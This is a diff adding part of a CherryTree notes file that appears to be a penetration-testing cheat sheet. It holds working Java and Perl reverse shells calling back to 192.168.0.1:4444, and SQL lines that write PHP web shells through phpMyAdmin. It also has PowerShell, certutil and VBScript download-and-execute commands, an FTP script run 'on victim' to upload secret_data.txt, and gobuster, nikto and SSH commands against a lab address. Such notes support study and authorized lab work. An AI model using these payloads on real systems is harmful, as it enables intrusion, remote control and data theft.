+          <rich_text family="monospace"> {p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">exitValue();</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
+          <rich_text family="monospace">;}</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
+          <rich_text family="monospace"> (Exception e){}};p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">destroy();s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">close();</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Windows Reverse Shell</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace">String host</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">"192.168.0.1";
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">int</rich_text>
+          <rich_text family="monospace"> port</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">4444</rich_text>
+          <rich_text family="monospace">;
+String cmd</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">"cmd.exe";
+Process p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
+          <rich_text family="monospace"> ProcessBuilder(cmd)</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">redirectErrorStream(</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">true</rich_text>
+          <rich_text family="monospace">)</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">start();Socket s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=new</rich_text>
+          <rich_text family="monospace"> Socket(host,port);InputStream pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getInputStream(),pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getErrorStream(), si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getInputStream();OutputStream po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getOutputStream(),so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">=</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">getOutputStream();</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">!</rich_text>
+          <rich_text family="monospace">s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">isClosed()){</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(pi</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(pe</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">while</rich_text>
+          <rich_text family="monospace">(si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">available()</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">0</rich_text>
+          <rich_text family="monospace">)po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">write(si</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">read());so</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">flush();po</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">flush();Thread</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">sleep(</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">50</rich_text>
+          <rich_text family="monospace">);</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">try</rich_text>
+          <rich_text family="monospace"> {p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">exitValue();</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">break</rich_text>
+          <rich_text family="monospace">;}</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">catch</rich_text>
+          <rich_text family="monospace"> (Exception e){}};p</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">destroy();s</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">.</rich_text>
+          <rich_text family="monospace">close();</rich_text>
+          <rich_text>
+
+</rich_text>
+        </node>
+        <node name="Perl" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text underline="single" scale="h1">Perl</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace">perl -MIO </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">-e</rich_text>
+          <rich_text family="monospace"> 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</rich_text>
+          <rich_text>
+
+</rich_text>
+        </node>
+        <node name="PhpmyAdmin" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
+          <rich_text underline="single" scale="h1">PhpmyAdmin
+</rich_text>
+          <rich_text>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text style="italic">Write a CMD shell into a file with the right permissions. Issue the following select. (Try different paths for different webservers)</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Windows</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
+          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\backdoor.php"</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Unix</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">SELECT</rich_text>
+          <rich_text family="monospace"> "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell.php"</rich_text>
+        </node>
+      </node>
+      <node name="File Transfer" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+        <node name="Powershell" unique_id="50" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">Powershell</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">As Cmd.exe Command</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\Users\john\Desktop\juicy.exe')</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Encode Command for Transfer</rich_text>
+          <rich_text>
+Very helpful for chars that need to be escaped otherwise.
+
+</rich_text>
+          <rich_text family="monospace">$Command = '(new-object System.Net.WebClient).DownloadFile("http://192.168.0.1:80/ftp.txt","C:\Windows\temp\ftp.txt")' 
+$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) 
+powershell.exe -NoProfile -encoded $Encoded</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</rich_text>
+        </node>
+        <node name="Certutil" unique_id="51" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">Certutil</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Download</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Download &amp; Execute Python Command</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\Windows\Temp\shell.exe &amp; C:\Windows\Temp\shell.exe')</rich_text>
+          <rich_text>
+
+</rich_text>
+        </node>
+        <node name="SMB" unique_id="52" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">SMB</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Start Impacket SMB Server (With SMB2 Support)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">impacket-smbserver -smb2support server_name /var/www/html</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">List Drives (Execute on Victim)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">net view \\192.168.0.1</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Copy Files (Execute on Victim)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">copy \\192.168.0.1\server_name\shell.exe shell.exe</rich_text>
+        </node>
+        <node name="PureFTP" unique_id="53" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">PureFTP</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Install</rich_text>
+          <rich_text>
+apt-get update </rich_text>
+          <rich_text foreground="#d73a49">&amp;&amp;</rich_text>
+          <rich_text> apt-get install pure-ftpd
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Create setupftp.sh Execute The Script</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace" foreground="#6a737d">#!</rich_text>
+          <rich_text family="monospace">/bin/bash
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd myftpuser -u ftpuser -d /ftphome
+pure-pw mkdb
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">cd</rich_text>
+          <rich_text family="monospace"> /etc/pure-ftpd/auth/
+sudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit
+mkdir -p /ftphome
+chown -R ftpuser:ftpgroup /ftphome/
+/etc/init.d/pure-ftpd restart./setupftp.sh</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Get Service Ready</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single" scale="h3">Reset Password</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single" scale="h3">Commit Changes</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">pure-pw mkdb</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single" scale="h3">Restart Service</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">/etc/init.d/pure-ftpd restart</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single" scale="h3">Create FTP Script (On Victim</rich_text>
+          <rich_text>)
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> open 192.168.0.</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">1&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> USER myftpuser</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> mypassword</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> bin</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> put secret_data.txt</rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt
+</rich_text>
+          <rich_text family="monospace" foreground="#005cc5">echo</rich_text>
+          <rich_text family="monospace"> bye </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> ftp.txt</rich_text>
+          <rich_text>
+
+</rich_text>
+          <rich_text underline="single" scale="h3">Exectue Script</rich_text>
+          <rich_text underline="single"> (On Victim)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">ftp -v -n -s:ftp.txt</rich_text>
+        </node>
+        <node name="Netcat" unique_id="54" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">Netcat</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Receiving Shell</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">nc -l -p 1234 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace"> out.file</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Sending Shell</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">nc -w 3 192.168.0.1 1234 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&lt;</rich_text>
+          <rich_text family="monospace"> out.file</rich_text>
+        </node>
+        <node name="TFTP" unique_id="55" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">TFTP</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Start TFTP Daemon (Folder /var/tftp)</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">atftpd --daemon --port 69 /var/tftp</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Transfer Files</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">tftp -i 192.168.0.1 GET whoami.exe</rich_text>
+        </node>
+        <node name="VBScript" unique_id="56" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690604" ts_lastsave="1687690604">
+          <rich_text underline="single" scale="h1">VBScript</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</rich_text>
+          <rich_text scale="h2">
+</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text underline="single" scale="h2">Create wget.vbs File</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">echo strUrl = WScript.Arguments.Item(0) </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo StrFile = WScript.Arguments.Item(1) </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Err.Clear </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Set http = Nothing </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo http.Open "GET",strURL,False </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo http.Send </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo varByteArray = http.ResponseBody </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Set http = Nothing </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo strData = "" </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo strBuffer = "" </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo Next </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs
+echo ts.Close </rich_text>
+          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
+          <rich_text family="monospace"> wget.vbs</rich_text>
+          <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+</rich_text>
+          <rich_text underline="single" scale="h2">Download Files</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
+        </node>
+      </node>
+      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1687292565">
+        <rich_text scale="h1">Directory BF
+</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+
+</rich_text>
+        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+
+</rich_text>
+        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+</rich_text>
+        <rich_text scale="h2">HTTPS</rich_text>
+        <rich_text>
+
+Set the </rich_text>
+        <rich_text family="monospace">--insecuressl</rich_text>
+        <rich_text> flag.</rich_text>
+        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.220 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.220 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
+        <codebox char_offset="103" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://192.168.162.220 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
+      </node>
+      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1687291548">
+        <rich_text scale="h2">SSH</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+_____________________________________
+
+</rich_text>
+        <rich_text scale="h3">Keygen</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+append to (server)
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+run the following in case
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text scale="h2">connecting:
+</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text foreground="#bf2e5e">ssh</rich_text>
+        <rich_text> -o </rich_text>
+        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
+        <rich_text> -o </rich_text>
+        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
+        <rich_text> -i temp root@192.168.162.220  -p 22
+
+
+_____________________________________
+
+</rich_text>
+        <rich_text scale="h2">Port-Forwarding:</rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>  </rich_text>
+        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.162.220 -p 22</codebox>
+        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
+        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
+        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
+        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 8000:127.0.0.1:8000 sau@192.168.162.220</codebox>
+      </node>
+      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687617725">
+        <rich_text scale="h2">Usage
+</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+
+</rich_text>
+        <rich_text scale="h2">using ports</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.162.220 -output niktooutput.log</codebox>
+        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 192.168.162.220 -port [port number 1], [port number 2], [port number 3]</codebox>
+      </node>
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1687690153">
+        <rich_text scale="h1">Nmap</rich_text>
+        <rich_text>
+
+
+Enumerate shares: 
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+vuln scan:
+
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
